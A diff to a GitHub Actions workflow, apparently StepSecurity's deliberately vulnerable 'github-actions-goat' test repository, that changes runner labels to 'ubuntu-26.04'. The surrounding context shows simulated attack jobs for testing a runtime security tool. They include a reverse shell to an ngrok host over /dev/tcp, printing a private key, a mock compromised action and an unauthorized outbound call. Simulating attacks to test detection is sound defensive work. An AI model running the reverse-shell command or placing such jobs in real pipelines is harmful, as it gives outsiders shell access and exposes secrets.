@@ -90,7 +90,7 @@ jobs:
 
   pytorch-simulation:
     if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-26.04
     steps:
     - uses: step-security/harden-runner@rc
       with:
@@ -104,7 +104,7 @@ jobs:
           https://api.github.com/repos/step-security-experiments/github-actions-goat/actions/runners/registration-token)
   reverse-shell: 
     if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-26.04
     steps:
       - uses: step-security/harden-runner@rc
         with:
@@ -117,7 +117,7 @@ jobs:
           bash -c "bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/17658 0>&1"
   privileged-conatiner:
     if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-26.04
     steps:
       - uses: step-security/harden-runner@rc
         with:
@@ -132,7 +132,7 @@ jobs:
 
   handle-private-key:
     if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-26.04
     steps:
     - uses: step-security/harden-runner@rc
       with:
@@ -154,7 +154,7 @@ jobs:
         cat private_key.pem
   imposter-commit:
     if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-26.04
     
     steps:
     - uses: step-security/harden-runner@rc
@@ -165,7 +165,7 @@ jobs:
     - uses: step-security/dummy-compromised-action@v1
   unauthorized-outbound-call:
     if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-26.04
     steps:
     - uses: step-security/harden-runner@rc
       with:
@@ -214,7 +214,7 @@ jobs:
     # done
     # wait
     # echo "All 100 baseline runs triggered!"
-    runs-on: ubuntu-latest
+    runs-on: ubuntu-26.04
     steps:
     - uses: step-security/harden-runner@rc
       with:
